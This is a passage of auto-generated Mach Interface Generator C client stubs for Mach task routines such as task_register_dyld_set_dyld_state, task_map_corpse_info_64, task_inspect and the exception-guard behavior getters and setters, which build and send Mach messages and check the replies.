		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = task;
	InP->Head.msgh_id = 3447;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(3447, "task_register_dyld_shared_cache_image_info")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(3447, "task_register_dyld_shared_cache_image_info")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__task_register_dyld_shared_cache_image_info_t__defined)
	check_result = __MIG_check__Reply__task_register_dyld_shared_cache_image_info_t((__Reply__task_register_dyld_shared_cache_image_info_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__task_register_dyld_shared_cache_image_info_t__defined) */

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__task_subsystem__
#if !defined(__MIG_check__Reply__task_register_dyld_set_dyld_state_t__defined)
#define __MIG_check__Reply__task_register_dyld_set_dyld_state_t__defined

mig_internal kern_return_t __MIG_check__Reply__task_register_dyld_set_dyld_state_t(__Reply__task_register_dyld_set_dyld_state_t *Out0P)
{

	typedef __Reply__task_register_dyld_set_dyld_state_t __Reply __attribute__((unused));
	if (Out0P->Head.msgh_id != 3548) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

#if	__MigTypeCheck
	if ((Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX) ||
	    (Out0P->Head.msgh_size != (mach_msg_size_t)sizeof(__Reply)))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	{
		return Out0P->RetCode;
	}
}
#endif /* !defined(__MIG_check__Reply__task_register_dyld_set_dyld_state_t__defined) */
#endif /* __MIG_check__Reply__task_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine task_register_dyld_set_dyld_state */
mig_external kern_return_t task_register_dyld_set_dyld_state
(
	task_t task,
	uint8_t dyld_state
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		uint8_t dyld_state;
		char dyld_statePad[3];
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__task_register_dyld_set_dyld_state_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__task_register_dyld_set_dyld_state_t__defined */

	__DeclareSendRpc(3448, "task_register_dyld_set_dyld_state")

	InP->NDR = NDR_record;

	InP->dyld_state = dyld_state;
	    for (int i = 0; i < 3; i++)
		    InP->dyld_statePad[i] = 0;

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = task;
	InP->Head.msgh_id = 3448;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(3448, "task_register_dyld_set_dyld_state")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(3448, "task_register_dyld_set_dyld_state")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__task_register_dyld_set_dyld_state_t__defined)
	check_result = __MIG_check__Reply__task_register_dyld_set_dyld_state_t((__Reply__task_register_dyld_set_dyld_state_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__task_register_dyld_set_dyld_state_t__defined) */

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__task_subsystem__
#if !defined(__MIG_check__Reply__task_register_dyld_get_process_state_t__defined)
#define __MIG_check__Reply__task_register_dyld_get_process_state_t__defined

mig_internal kern_return_t __MIG_check__Reply__task_register_dyld_get_process_state_t(__Reply__task_register_dyld_get_process_state_t *Out0P)
{

	typedef __Reply__task_register_dyld_get_process_state_t __Reply __attribute__((unused));
#if	__MigTypeCheck
	unsigned int msgh_size;
#endif	/* __MigTypeCheck */
	if (Out0P->Head.msgh_id != 3549) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

#if	__MigTypeCheck
	msgh_size = Out0P->Head.msgh_size;

	if ((Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX) ||
	    ((msgh_size != (mach_msg_size_t)sizeof(__Reply)) &&
	     (msgh_size != (mach_msg_size_t)sizeof(mig_reply_error_t) ||
	      Out0P->RetCode == KERN_SUCCESS)))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	if (Out0P->RetCode != KERN_SUCCESS) {
		return ((mig_reply_error_t *)Out0P)->RetCode;
	}

	return MACH_MSG_SUCCESS;
}
#endif /* !defined(__MIG_check__Reply__task_register_dyld_get_process_state_t__defined) */
#endif /* __MIG_check__Reply__task_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine task_register_dyld_get_process_state */
mig_external kern_return_t task_register_dyld_get_process_state
(
	task_t task,
	dyld_kernel_process_info_t *dyld_process_state
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		dyld_kernel_process_info_t dyld_process_state;
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		dyld_kernel_process_info_t dyld_process_state;
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__task_register_dyld_get_process_state_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__task_register_dyld_get_process_state_t__defined */

	__DeclareSendRpc(3449, "task_register_dyld_get_process_state")

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = task;
	InP->Head.msgh_id = 3449;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(3449, "task_register_dyld_get_process_state")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(3449, "task_register_dyld_get_process_state")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__task_register_dyld_get_process_state_t__defined)
	check_result = __MIG_check__Reply__task_register_dyld_get_process_state_t((__Reply__task_register_dyld_get_process_state_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__task_register_dyld_get_process_state_t__defined) */

	*dyld_process_state = Out0P->dyld_process_state;

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__task_subsystem__
#if !defined(__MIG_check__Reply__task_map_corpse_info_64_t__defined)
#define __MIG_check__Reply__task_map_corpse_info_64_t__defined

mig_internal kern_return_t __MIG_check__Reply__task_map_corpse_info_64_t(__Reply__task_map_corpse_info_64_t *Out0P)
{

	typedef __Reply__task_map_corpse_info_64_t __Reply __attribute__((unused));
#if	__MigTypeCheck
	unsigned int msgh_size;
#endif	/* __MigTypeCheck */
	if (Out0P->Head.msgh_id != 3550) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

#if	__MigTypeCheck
	msgh_size = Out0P->Head.msgh_size;

	if ((Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX) ||
	    ((msgh_size != (mach_msg_size_t)sizeof(__Reply)) &&
	     (msgh_size != (mach_msg_size_t)sizeof(mig_reply_error_t) ||
	      Out0P->RetCode == KERN_SUCCESS)))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	if (Out0P->RetCode != KERN_SUCCESS) {
		return ((mig_reply_error_t *)Out0P)->RetCode;
	}

	return MACH_MSG_SUCCESS;
}
#endif /* !defined(__MIG_check__Reply__task_map_corpse_info_64_t__defined) */
#endif /* __MIG_check__Reply__task_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine task_map_corpse_info_64 */
mig_external kern_return_t task_map_corpse_info_64
(
	task_t task,
	task_read_t corspe_task,
	mach_vm_address_t *kcd_addr_begin,
	mach_vm_size_t *kcd_size
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t corspe_task;
		/* end of the kernel processed data */
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_vm_address_t kcd_addr_begin;
		mach_vm_size_t kcd_size;
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_vm_address_t kcd_addr_begin;
		mach_vm_size_t kcd_size;
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__task_map_corpse_info_64_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__task_map_corpse_info_64_t__defined */

	__DeclareSendRpc(3450, "task_map_corpse_info_64")

#if	UseStaticTemplates
	const static mach_msg_port_descriptor_t corspe_taskTemplate = {
		/* name = */		MACH_PORT_NULL,
		/* pad1 = */		0,
		/* pad2 = */		0,
		/* disp = */		19,
		/* type = */		MACH_MSG_PORT_DESCRIPTOR,
	};
#endif	/* UseStaticTemplates */

	InP->msgh_body.msgh_descriptor_count = 1;
#if	UseStaticTemplates
	InP->corspe_task = corspe_taskTemplate;
	InP->corspe_task.name = corspe_task;
#else	/* UseStaticTemplates */
	InP->corspe_task.name = corspe_task;
	InP->corspe_task.disposition = 19;
	InP->corspe_task.type = MACH_MSG_PORT_DESCRIPTOR;
#endif	/* UseStaticTemplates */

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits = MACH_MSGH_BITS_COMPLEX|
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = task;
	InP->Head.msgh_id = 3450;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(3450, "task_map_corpse_info_64")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(3450, "task_map_corpse_info_64")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__task_map_corpse_info_64_t__defined)
	check_result = __MIG_check__Reply__task_map_corpse_info_64_t((__Reply__task_map_corpse_info_64_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__task_map_corpse_info_64_t__defined) */

	*kcd_addr_begin = Out0P->kcd_addr_begin;

	*kcd_size = Out0P->kcd_size;

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__task_subsystem__
#if !defined(__MIG_check__Reply__task_inspect_t__defined)
#define __MIG_check__Reply__task_inspect_t__defined

mig_internal kern_return_t __MIG_check__Reply__task_inspect_t(__Reply__task_inspect_t *Out0P)
{

	typedef __Reply__task_inspect_t __Reply __attribute__((unused));
#if	__MigTypeCheck
	unsigned int msgh_size;
#endif	/* __MigTypeCheck */

	if (Out0P->Head.msgh_id != 3551) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

#if	__MigTypeCheck
	msgh_size = Out0P->Head.msgh_size;

	if ((Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX) ||
	    ((msgh_size > (mach_msg_size_t)sizeof(__Reply) || msgh_size < (mach_msg_size_t)(sizeof(__Reply) - 16)) &&
	     (msgh_size != (mach_msg_size_t)sizeof(mig_reply_error_t) ||
	      Out0P->RetCode == KERN_SUCCESS)))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	if (Out0P->RetCode != KERN_SUCCESS) {
		return ((mig_reply_error_t *)Out0P)->RetCode;
	}

#if	__MigTypeCheck
	if ( Out0P->info_outCnt > 4 )
		return MIG_TYPE_ERROR;
	if (((msgh_size - (mach_msg_size_t)(sizeof(__Reply) - 16)) / 4< Out0P->info_outCnt) ||
	    (msgh_size != (mach_msg_size_t)(sizeof(__Reply) - 16) + Out0P->info_outCnt * 4))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

	return MACH_MSG_SUCCESS;
}
#endif /* !defined(__MIG_check__Reply__task_inspect_t__defined) */
#endif /* __MIG_check__Reply__task_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine task_inspect */
mig_external kern_return_t task_inspect
(
	task_inspect_t task,
	task_inspect_flavor_t flavor,
	task_inspect_info_t info_out,
	mach_msg_type_number_t *info_outCnt
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		task_inspect_flavor_t flavor;
		mach_msg_type_number_t info_outCnt;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_type_number_t info_outCnt;
		integer_t info_out[4];
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_type_number_t info_outCnt;
		integer_t info_out[4];
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__task_inspect_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__task_inspect_t__defined */

	__DeclareSendRpc(3451, "task_inspect")

	InP->NDR = NDR_record;

	InP->flavor = flavor;

	if (*info_outCnt < 4)
		InP->info_outCnt = *info_outCnt;
	else
		InP->info_outCnt = 4;

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = task;
	InP->Head.msgh_id = 3451;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(3451, "task_inspect")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(3451, "task_inspect")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__task_inspect_t__defined)
	check_result = __MIG_check__Reply__task_inspect_t((__Reply__task_inspect_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__task_inspect_t__defined) */

	if (Out0P->info_outCnt > *info_outCnt) {
		(void)memcpy((char *) info_out, (const char *) Out0P->info_out, 4 *  *info_outCnt);
		*info_outCnt = Out0P->info_outCnt;
		{ return MIG_ARRAY_TOO_LARGE; }
	}
	(void)memcpy((char *) info_out, (const char *) Out0P->info_out, 4 * Out0P->info_outCnt);

	*info_outCnt = Out0P->info_outCnt;

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__task_subsystem__
#if !defined(__MIG_check__Reply__task_get_exc_guard_behavior_t__defined)
#define __MIG_check__Reply__task_get_exc_guard_behavior_t__defined

mig_internal kern_return_t __MIG_check__Reply__task_get_exc_guard_behavior_t(__Reply__task_get_exc_guard_behavior_t *Out0P)
{

	typedef __Reply__task_get_exc_guard_behavior_t __Reply __attribute__((unused));
#if	__MigTypeCheck
	unsigned int msgh_size;
#endif	/* __MigTypeCheck */
	if (Out0P->Head.msgh_id != 3552) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

#if	__MigTypeCheck
	msgh_size = Out0P->Head.msgh_size;

	if ((Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX) ||
	    ((msgh_size != (mach_msg_size_t)sizeof(__Reply)) &&
	     (msgh_size != (mach_msg_size_t)sizeof(mig_reply_error_t) ||
	      Out0P->RetCode == KERN_SUCCESS)))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	if (Out0P->RetCode != KERN_SUCCESS) {
		return ((mig_reply_error_t *)Out0P)->RetCode;
	}

	return MACH_MSG_SUCCESS;
}
#endif /* !defined(__MIG_check__Reply__task_get_exc_guard_behavior_t__defined) */
#endif /* __MIG_check__Reply__task_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine task_get_exc_guard_behavior */
mig_external kern_return_t task_get_exc_guard_behavior
(
	task_inspect_t task,
	task_exc_guard_behavior_t *behavior
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		task_exc_guard_behavior_t behavior;
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		task_exc_guard_behavior_t behavior;
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__task_get_exc_guard_behavior_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__task_get_exc_guard_behavior_t__defined */

	__DeclareSendRpc(3452, "task_get_exc_guard_behavior")

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = task;
	InP->Head.msgh_id = 3452;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(3452, "task_get_exc_guard_behavior")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(3452, "task_get_exc_guard_behavior")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__task_get_exc_guard_behavior_t__defined)
	check_result = __MIG_check__Reply__task_get_exc_guard_behavior_t((__Reply__task_get_exc_guard_behavior_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__task_get_exc_guard_behavior_t__defined) */

	*behavior = Out0P->behavior;

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__task_subsystem__
#if !defined(__MIG_check__Reply__task_set_exc_guard_behavior_t__defined)
#define __MIG_check__Reply__task_set_exc_guard_behavior_t__defined

mig_internal kern_return_t __MIG_check__Reply__task_set_exc_guard_behavior_t(__Reply__task_set_exc_guard_behavior_t *Out0P)
{

	typedef __Reply__task_set_exc_guard_behavior_t __Reply __attribute__((unused));
	if (Out0P->Head.msgh_id != 3553) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

#if	__MigTypeCheck
	if ((Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX) ||
	    (Out0P->Head.msgh_size != (mach_msg_size_t)sizeof(__Reply)))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	{
		return Out0P->RetCode;
	}
}
#endif /* !defined(__MIG_check__Reply__task_set_exc_guard_behavior_t__defined) */
#endif /* __MIG_check__Reply__task_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine task_set_exc_guard_behavior */
mig_external kern_return_t task_set_exc_guard_behavior
(
	task_t task,
	task_exc_guard_behavior_t behavior
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		task_exc_guard_behavior_t behavior;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__task_set_exc_guard_behavior_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__task_set_exc_guard_behavior_t__defined */

	__DeclareSendRpc(3453, "task_set_exc_guard_behavior")

	InP->NDR = NDR_record;

	InP->behavior = behavior;

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
